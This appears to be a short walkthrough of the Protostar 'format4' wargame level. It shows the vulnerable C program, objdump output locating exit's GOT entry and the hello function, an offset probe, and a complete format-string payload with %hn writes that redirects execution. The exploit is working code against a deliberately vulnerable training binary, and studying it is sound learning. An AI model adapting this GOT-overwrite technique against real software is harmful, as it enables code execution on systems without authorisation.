#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void hello()
{
  printf("code execution redirected! you win\n");
  _exit(1);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printf(buffer);

  exit(1);  
}

int main(int argc, char **argv)
{
  vuln();
}


user@protostar:/opt/protostar/bin$ objdump -TR format4 

format4:     file format elf32-i386

DYNAMIC SYMBOL TABLE:
00000000  w   D  *UND*  00000000              __gmon_start__
00000000      DF *UND*  00000000  GLIBC_2.0   fgets
00000000      DF *UND*  00000000  GLIBC_2.0   __libc_start_main
00000000      DF *UND*  00000000  GLIBC_2.0   _exit
00000000      DF *UND*  00000000  GLIBC_2.0   printf
00000000      DF *UND*  00000000  GLIBC_2.0   puts
00000000      DF *UND*  00000000  GLIBC_2.0   exit
080485ec g    DO .rodata        00000004  Base        _IO_stdin_used
08049730 g    DO .bss   00000004  GLIBC_2.0   stdin


DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
080496fc R_386_GLOB_DAT    __gmon_start__
08049730 R_386_COPY        stdin
0804970c R_386_JUMP_SLOT   __gmon_start__
08049710 R_386_JUMP_SLOT   fgets
08049714 R_386_JUMP_SLOT   __libc_start_main
08049718 R_386_JUMP_SLOT   _exit
0804971c R_386_JUMP_SLOT   printf
08049720 R_386_JUMP_SLOT   puts
08049724 R_386_JUMP_SLOT   exit   (写入的目标地址)


user@protostar:/opt/protostar/bin$

user@protostar:/opt/protostar/bin$ objdump -d format4
.......
080484b4 <hello>:    (写入的数据)
..........

user@protostar:/opt/protostar/bin$ echo $(perl -e 'print "AAAA"."[%08x]"x(4)') | ./format4  
AAAA[00000200][b7fd6420][bffff594][41414141]  (offset = 4)
user@protostar:/opt/protostar/bin$ 


[addr + 2] : \x26\x97\x04\x08
[addr]     : \x24\x97\x04\x08
%[HOB-8]x  : %.2044x
%[offset]$hn: %4\$hn
%[LOB-HOB]x: %.31920x
%[offset + 1]$hn: %5\$hn

user@protostar:/opt/protostar/bin$ echo  $(python -c "print '\x26\x97\x04\x08\x24\x97\x04\x08'+'%.2044x%4\$hn%.31920x%5\$hn'") | ./format4
&$000000000000000000000000000000000000000000000000000000000....
code execution redirected! you win

